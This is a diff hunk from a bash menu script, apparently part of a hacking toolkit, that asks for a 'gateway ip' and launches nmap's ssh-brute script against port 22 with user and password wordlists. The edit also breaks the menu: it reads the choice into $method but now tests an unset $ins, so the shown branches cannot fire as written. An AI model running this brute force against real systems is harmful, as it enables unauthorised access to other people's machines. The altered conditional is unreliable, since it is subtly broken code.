@@ -60,14 +60,16 @@ function main(){
 	echo -e ""
 	read -p "[+] Choose number: " method
 	
-	if [[ $method == "1" || $method == "01" ]]; then
+	if [[ $ins -eq 1 || $ins -eq 01 ]]
+	then
 		clear
 		echo -e "Cracking SSH using Nmap" | toilet -f smbraille | lolcat
 		echo -e "\e[1m\e[92m"
 		read -p "[+] Enter gateway ip: " ip
 		echo -e "\e[0m"
 		nmap $ip -p 22 --script ssh-brute --script-args userdb=user.txt,passdb=password.txt
-	elif [[ $method == "0" || $method == "00" ]]; then
+	elif [[ $ins -eq 2 || $ins -eq 02 ]]
+	then
 		clear && exit
 	else
 		echo ""
